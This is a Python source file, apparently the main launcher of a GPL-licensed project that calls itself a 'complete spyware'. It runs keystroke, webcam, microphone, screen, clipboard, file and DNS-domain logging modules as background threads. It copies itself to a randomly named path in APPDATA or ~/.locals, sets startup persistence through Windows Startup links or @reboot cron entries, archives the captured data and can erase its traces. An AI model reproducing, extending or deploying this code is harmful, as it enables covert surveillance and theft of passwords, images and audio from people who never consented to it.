#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This file implements a complete spyware.
#    Copyright (C) 2021, 2022, 2023, 2024  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This file implements a complete spyware.
"""

__version__ = "1.0.6"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This file implements a complete spyware.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/SpyWare"

copyright = """
SpyWare  Copyright (C) 2021, 2022, 2023, 2024  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["spy", "join", "stop_deamons", "main", "modules"]

try:
    from ClipboardLogger.ClipboardLogger import (
        Daemon as ClipboardDaemon,
        config_load as clipboardConfig,
        CONFIGURATIONS as clipboard_config,
    )
    from DomainsLogger.DomainsLogger import (
        Daemon as DomainsDaemon,
        config_load as domainsConfig,
        CONFIGURATIONS as domains_config,
    )
    from ScreenLogger.ScreenLogger import (
        Daemon as ScreenDaemon,
        config_load as screenConfig,
        CONFIGURATIONS as screen_config,
    )
    from WebcamLogger.WebcamLogger import (
        Daemon as WebcamDaemon,
        config_load as webcamConfig,
        CONFIGURATIONS as webcam_config,
    )
    from AudioLogger.AudioLogger import (
        Daemon as AudioDaemon,
        config_load as audioConfig,
        CONFIGURATIONS as audio_config,
    )
    from FilesLogger.FilesLogger import (
        Daemon as FilesDaemon,
        config_load as filesConfig,
        CONFIGURATIONS as files_config,
    )
    from KeyLogger.KeyLogger import (
        Daemon as KeyDaemon,
        config_load as keyConfig,
        CONFIGURATIONS as key_config,
    )
except ImportError:
    from .ClipboardLogger.ClipboardLogger import (
        Daemon as ClipboardDaemon,
        config_load as clipboardConfig,
        CONFIGURATIONS as clipboard_config,
    )
    from .DomainsLogger.DomainsLogger import (
        Daemon as DomainsDaemon,
        config_load as domainsConfig,
        CONFIGURATIONS as domains_config,
    )
    from .ScreenLogger.ScreenLogger import (
        Daemon as ScreenDaemon,
        config_load as screenConfig,
        CONFIGURATIONS as screen_config,
    )
    from .WebcamLogger.WebcamLogger import (
        Daemon as WebcamDaemon,
        config_load as webcamConfig,
        CONFIGURATIONS as webcam_config,
    )
    from .AudioLogger.AudioLogger import (
        Daemon as AudioDaemon,
        config_load as audioConfig,
        CONFIGURATIONS as audio_config,
    )
    from .FilesLogger.FilesLogger import (
        Daemon as FilesDaemon,
        config_load as filesConfig,
        CONFIGURATIONS as files_config,
    )
    from .KeyLogger.KeyLogger import (
        Daemon as KeyDaemon,
        config_load as keyConfig,
        CONFIGURATIONS as key_config,
    )

from os import (
    environ,
    scandir,
    makedirs,
    rename,
    link,
    listdir,
    remove,
    chdir,
    getcwd,
)
from os.path import splitext, expanduser, basename, exists, join, dirname
from argparse import ArgumentParser, Namespace
from string import digits, ascii_letters
from sys import argv, exit, executable
from tarfile import open as tar_open
from collections.abc import Hashable
from typing import Dict, List, Tuple
from random import choices, choice
from shutil import rmtree, move
from threading import Thread
from platform import system
from getpass import getuser
from atexit import register
from glob import glob

system: str = system()

modules: Dict[str, str] = {
    "audio": "audioSpy.conf",
    "clipboard": "clipboardSpy.conf",
    "domains": "domainsSpy.conf",
    "files": "filesSpy.conf",
    "key": "keySpy.conf",
    "screen": "screenSpy.conf",
    "webcam": "webcamSpy.conf",
}


def join_all(*threads: List[Thread]) -> None:

    """
    This function join threads.
    """

    for thread in threads:
        thread.join()


def stop_deamons(*daemons: List[Thread]) -> None:

    """
    This function sent daemon's stop signal.
    """

    for daemon in daemons:
        daemon.run = False


def spy(modules: Dict[str, str]) -> int:

    """
    This function starts spy modules and stop it on KeyboardInterrupt.
    """

    EXITCODE = 0
    namespace = globals().copy()
    namespace.update(locals())
    threads = []
    daemons = []

    for module, config in modules.items():
        module = module.lower()

        config = namespace[f"{module}Config"](config)
        daemon = namespace[f"{module.title()}Daemon"]()

        daemons.append(daemon)

        if module == "domains":
            thread = Thread(target=daemon.run_CacheDns)
            thread.daemon = True
            threads.append(thread)
            thread.start()

            thread = Thread(target=daemon.run_AppData)
            thread.daemon = True
            threads.append(thread)
            thread.start()
        else:
            thread = Thread(target=daemon.run_for_ever)
            thread.daemon = True
            threads.append(thread)
            thread.start()

    try:
        join_all(*threads)
    except KeyboardInterrupt:
        stop_deamons(*daemons)
    finally:
        join_all(*threads)

    return EXITCODE


def env(keyvalue: str) -> None:

    """
    This function adds environment variables.
    """

    if "=" not in keyvalue:
        raise ValueError(
            "Environment variable should contains a "
            "string key and a string value separate by '='."
        )

    key, value = keyvalue.split("=", 1)
    environ[key] = value


def parse_args() -> Namespace:

    """
    This function parses command line arguments.
    """

    arguments = ArgumentParser(
        description="This file implements a complete spyware."
    )

    add_argument = arguments.add_argument

    add_argument(
        "--env",
        "-e",
        type=env,
        action="extend",
        nargs="*",
        help=(
            "Add environment variable, values "
            "should be formatted as <key>=<value>"
        ),
    )
    add_argument(
        "--install",
        "-i",
        action="store_true",
        help=(
            "Install the spyware in APPDATA and enabled"
            " it (launch on startup)"
        ),
    )
    add_argument(
        "--enable",
        "-E",
        action="store_true",
        help="Enable the spyware (launch it on startup)",
    )
    add_argument(
        "--remove",
        "-r",
        action="store_true",
        help="Remove spyware trace (executable/script, links and data)",
    )
    add_argument(
        "--tar",
        "-t",
        const="",
        nargs="?",
        choices={"gz", "xz", "bz2"},
        help=(
            "Build a tar file with data, optional value should"
            " be 'gz', 'xz', 'bz2' to compress."
        ),
    )

    modules_selection = arguments.add_subparsers(
        dest="modules", help="Modules selection type.", required=False
    )
    add_parser = modules_selection.add_parser

    runonly = add_parser("runonly", help="Run only specified modules.")
    runonly_modules = runonly.add_argument_group(
        "modules", "SpyWare modules to launch in this process."
    )
    runonly_add_argument = runonly_modules.add_argument

    donotrun = add_parser("donotrun", help="Do not run specified modules.")
    donotrun_modules = donotrun.add_argument_group(
        "modules", "SpyWare modules to not launch in this process."
    )
    donotrun_add_argument = donotrun_modules.add_argument

    for module, config in modules.items():
        runonly_add_argument(
            f"--{module}",
            f"-{module[0]}",
            nargs="?",
            const=config,
            help=(
                f"Run module {module} with optional value "
                f"as configuration file (default={config})."
            ),
        )
        donotrun_add_argument(
            f"--{module}",
            f"-{module[0]}",
            action="store_true",
            help=f"Do not run module {module}.",
        )

    return arguments.parse_args()


def get_random_path() -> Tuple[str, str, str]:

    """
    This function returns a random path.
    """

    executable = argv[0]
    extension = splitext(executable)[1]

    if system == "Windows":
        appdata_path = environ["APPDATA"]
    else:
        appdata_path = join(expanduser("~"), ".locals")

    dirnames = [
        join(appdata_path, x.name) for x in scandir(appdata_path) if x.is_dir()
    ]

    filenames = [
        splitext(x.name)[0] + extension
        for dirname in dirnames
        for x in scandir(dirname)
        if x.is_file()
    ]
    filenames.append(
        "".join(choices(ascii_letters + digits, k=choice(range(1, 15))))
        + extension
    )

    dirnames.append(
        join(
            appdata_path,
            "".join(choices(ascii_letters + digits, k=choice(range(1, 15)))),
        )
    )

    filename = choice(filenames)
    dir_name = choice(dirnames)
    path = join(dir_name, filename)

    while exists(path):
        filename = choice(filenames)
        dir_name = choice(dirnames)
        path = join(dir_name, filename)

    return path, dir_name, filename


def install() -> None:

    """
    This function move the SpyWare in APPDATA.
    """

    path, dir_name, filename = get_random_path()
    executable = argv[0]
    executable_dir = dirname(executable)

    if glob(join(executable_dir, "*/*.py")):
        # If is the package source code
        # or multi files executable.
        # The filenames and directories
        # names are not checks to leave
        # the modification right to the user.
        dir_name = join(dir_name, basename(dir_name))
        path = join(dir_name, filename)

        move(join(executable_dir, "."), dir_name)

        executable = join(dir_name, basename(executable))

    makedirs(dir_name, exist_ok=True)

    try:
        rename(executable, path)
    except FileExistsError:
        install()

    chdir(dir_name)
    argv[0] = path
    enabled(path)


def enabled(path: str = argv[0]) -> None:

    """
    This function enables the SpyWare (to start on startup).

    Use cron on UNIX system (try root and user).
    Use StartUp directory on Windows (try all users and user).
    """

    if system == "Windows":
        try:
            link_path = (
                "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs"
                f"\\StartUp\\{basename(path)}.lnk"
            )
            if exists(link_path):
                remove(link_path)
            link(
                path,
                link_path,
            )
        except PermissionError:
            link_path = (
                f"C:\\Users\\{getuser()}\\AppData\\Roaming\\Microsoft\\Wind"
                f"ows\\Start Menu\\Programs\\Startup\\{basename(path)}.lnk"
            )
            if exists(link_path):
                remove(link_path)
            link(
                path,
                link_path,
            )

        return None

    try:
        with open("/var/spool/cron/root") as file:
            print(f"\n@reboot {executable} {path}", file=file)
    except PermissionError:
        with open(f"/var/spool/cron/{getuser()}") as file:
            print(f"\n@reboot {executable} {path}", file=file)


def remove_trace(modules: Dict[str, str] = modules) -> None:

    """
    This function removes trace of SpyWare.
    """

    namespace = globals().copy()
    namespace.update(locals())
    executable_dir = dirname(argv[0])

    if glob(join(executable_dir, "*/*.py")):
        rmtree(executable_dir)
    else:
        for module in modules:
            dir_name = getattr(namespace[f"{module}_config"], "save_dirname", None)
            filename = getattr(
                namespace[f"{module}_config"], "save_filename", None
            )

            if dir_name and exists(dir_name):
                rmtree(dir_name)
            elif filename and exists(filename):
                remove(filename)

        for doc in glob("archive_*.tar*"):
            remove(doc)

        remove(argv[0])

    for config in modules.values():
        if exists(config):
            remove(config)


def archive(modules: Dict[str, str] = modules, mode: str = "") -> str:

    """
    This function archives data.
    """

    name = choices(ascii_letters + digits, k=choice(range(1, 15)))
    filename = f"archive_{name}.tar" + f".{mode}" if mode else mode

    namespace = globals().copy()
    namespace.update(locals())

    with tar_open(filename, f"w:{mode}") as file:

        for module in modules:
            dir_name = getattr(
                namespace[f"{module}_config"], "save_dirname", None
            )
            filename = getattr(
                namespace[f"{module}_config"], "save_filename", None
            )

            if dir_name and exists(dir_name):
                for filename in listdir(dir_name):
                    file.add(filename)
            elif filename and exists(filename):
                file.add(filename)


def cleandict(dict_: dict, keys: List[Hashable]) -> dict:

    """
    This function clean a dictionary.
    """

    for key in keys:
        if key in dict_:
            del dict_[key]
    return dict_


def get_modules(arguments: Namespace) -> Dict[str, str]:

    """
    This function builds the modules dict from arguments.
    """

    modules_config = arguments.__dict__.copy()

    is_mode_donotrun = arguments.modules == "donotrun"

    cleandict(
        modules_config, ["env", "enable", "remove", "modules", "install"]
    )

    if is_mode_donotrun:
        modules_copy = modules.copy()
    else:
        active_modules = {}

    for module, config in modules_config.items():
        if is_mode_donotrun:
            if config is not None:
                del modules_copy[module]
        else:
            if config is not None:
                active_modules[module] = config

    return modules_copy if is_mode_donotrun else active_modules


def main() -> int:

    """
    This function launchs the SpyWare modules from the command line.
    """

    arguments = parse_args()

    if arguments.install:
        install()
    elif arguments.enable:
        enabled()

    if arguments.modules is None:
        active_modules = modules
    else:
        active_modules = get_modules(parse_args())

    tar = arguments.tar
    if arguments.remove:
        register(remove_trace, active_modules)
    elif tar is not None:
        register(archive, active_modules, tar)

    EXITCODE = spy(active_modules)

    # tar = arguments.tar
    # if arguments.remove:
    #     remove_trace(active_modules)
    # elif tar is not None:
    #     archive(active_modules, tar)

    return EXITCODE


if __name__ == "__main__":
    print(copyright)
    exit(main())
